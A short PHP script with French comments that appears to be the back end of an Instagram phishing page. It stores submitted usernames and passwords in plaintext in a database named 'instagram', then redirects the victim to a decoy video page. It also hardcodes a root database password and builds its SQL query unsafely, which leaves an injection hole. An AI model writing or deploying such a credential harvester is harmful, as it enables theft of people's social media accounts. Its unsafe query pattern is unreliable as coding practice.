<?php
$servername = "localhost";
$username = "root";
$password = "j_1TjR-eBjnCGV7X";
$dbname = "instagram";

// Créer une connexion
$conn = new mysqli($servername, $username, $password, $dbname);

// Vérifier la connexion
if ($conn->connect_error) {
    die("Connexion échouée: " . $conn->connect_error);
}

// Récupérer les données du formulaire
$user = $_POST['username'];
$pass = $_POST['password'];

// Insérer les données dans la base de données
$sql = "INSERT INTO users (username, password) VALUES ('$user', '$pass')";

if ($conn->query($sql) === TRUE) {
    echo "Données enregistrées avec succès";
} else {
    echo "Erreur: " . $sql . "<br>" . $conn->error;
}

$conn->close();

// Rediriger vers la page de vidéo
header('Location: video_page_instagram.html');
exit;
?>
